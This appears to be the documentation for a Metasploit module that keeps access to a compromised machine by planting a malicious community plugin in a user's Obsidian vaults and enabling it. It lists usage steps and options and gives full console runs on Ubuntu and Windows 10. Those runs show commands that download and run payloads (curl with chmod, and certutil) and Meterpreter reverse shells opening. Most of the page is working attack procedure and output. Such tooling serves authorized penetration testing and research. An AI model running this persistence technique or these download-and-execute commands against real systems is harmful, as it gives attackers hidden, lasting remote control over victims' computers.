## Vulnerable Application

This module searches for Obsidian vaults for a user, and uploads a malicious
community plugin to the vault. The vaults must be opened with community
plugins enabled (NOT restricted mode), but the plugin will be enabled
automatically.

Tested against Obsidian 1.7.7 on Kali, Ubuntu 22.04, and Windows 10.

### Debugging

To open the console (similar to chrome), use `ctr+shift+i`.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Get a user shell on the target
4. Do: `use multi/local/obsidian_plugin_persistence`
5. Do: Select a shell which will work on your target OS
6. Do: `run`
7. You should get a shell when the target user opens the vault without restricted mode.

## Options

### NAME

Name of the plugin. Defaults to being randomly generated.

### USER

The user to target. Defaults the user the shell was obtained under.

### CONFIG

Config file location on target. Defaults to empty which will search the default locations.

## Scenarios

### Version and OS

Get a user shell.

```
msf6 exploit(multi/script/web_delivery) > use exploit/multi/local/obsidian_plugin_persistence
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/local/obsidian_plugin_persistence) > set session 1
session => 1
msf6 exploit(multi/local/obsidian_plugin_persistence) > set verbose true
verbose => true
msf6 exploit(multi/local/obsidian_plugin_persistence) > exploit

[*] Command to run on remote host: curl -so ./HvxtaAdZVc http://1.1.1.1:8080/aZRe4yWUN3U2-lDtdsaGlA; chmod +x ./HvxtaAdZVc; ./HvxtaAdZVc &
[*] Fetch handler listening on 1.1.1.1:8080
[*] HTTP server started
[*] Adding resource /aZRe4yWUN3U2-lDtdsaGlA
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Using plugin name: xQem
[*] Target User: ubuntu
[*] Found user obsidian file: /home/ubuntu/.config/obsidian/obsidian.json
[+] Found open vault 83ca6e5734f5dfc4: /home/ubuntu/Documents/test
[*] Uploading plugin to vault /home/ubuntu/Documents/test
[*] Uploading: /home/ubuntu/Documents/test/.obsidian/plugins/xQem/main.js
[*] Uploading: /home/ubuntu/Documents/test/.obsidian/plugins/xQem/manifest.json
[*] Found 1 enabled community plugins (sX2sv4)
[*] adding xQem to the enabled community plugins list
[+] Plugin enabled, waiting for Obsidian to open the vault and execute the plugin.
[*] Client 2.2.2.2 requested /aZRe4yWUN3U2-lDtdsaGlA
[*] Sending payload to 2.2.2.2 (curl/7.81.0)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045380 bytes) to 2.2.2.2
[*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:49192) at 2024-12-05 10:19:32 -0500

meterpreter > getuid
Server username: ubuntu
meterpreter > sysinfo
Computer     : 2.2.2.2
OS           : Ubuntu 22.04 (Linux 5.15.0-60-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```

### Obsidian 1.7.7 on Windows 10

```

msf6 exploit(multi/local/obsidian_plugin_persistence) > rexploit
[*] Reloading module...

[*] Command to run on remote host: certutil -urlcache -f http://1.1.1.1:8080/bXCLrS0dWKPwEfygT3FJNA %TEMP%\FDTcKUuwF.exe & start /B %TEMP%\FDTcKUuwF.exe
[*] Fetch handler listening on 1.1.1.1:8080
[*] HTTP server started
[*] Adding resource /bXCLrS0dWKPwEfygT3FJNA
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Using plugin name: pPq0K
[*] Target User: h00die
[*] Found user obsidian file: C:\Users\h00die\AppData\Roaming\obsidian\obsidian.json
[+] Found open vault 69172dadc065de73: C:\Users\h00die\Documents\vault
[*] Uploading plugin to vault C:\Users\h00die\Documents\vault
[*] Uploading: C:\Users\h00die\Documents\vault/.obsidian/plugins/pPq0K/main.js
[*] Uploading: C:\Users\h00die\Documents\vault/.obsidian/plugins/pPq0K/manifest.json
[*] Found 0 enabled community plugins ()
[*] adding pPq0K to the enabled community plugins list
[+] Plugin enabled, waiting for Obsidian to open the vault and execute the plugin.
[*] Client 3.3.3.3 requested /bXCLrS0dWKPwEfygT3FJNA
[*] Sending payload to 3.3.3.3 (Microsoft-CryptoAPI/10.0)
[*] Client 3.3.3.3 requested /bXCLrS0dWKPwEfygT3FJNA
[*] Sending payload to 3.3.3.3 (CertUtil URL Agent)
[*] Meterpreter session 7 opened (1.1.1.1:4444 -> 3.3.3.3:51369) at 2024-12-05 09:24:24 -0500

meterpreter > getuid
Server username: DESKTOP-3ASD0R4\h00die
meterpreter > sysinfo
Computer        : DESKTOP-3ASD0R4
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 
```
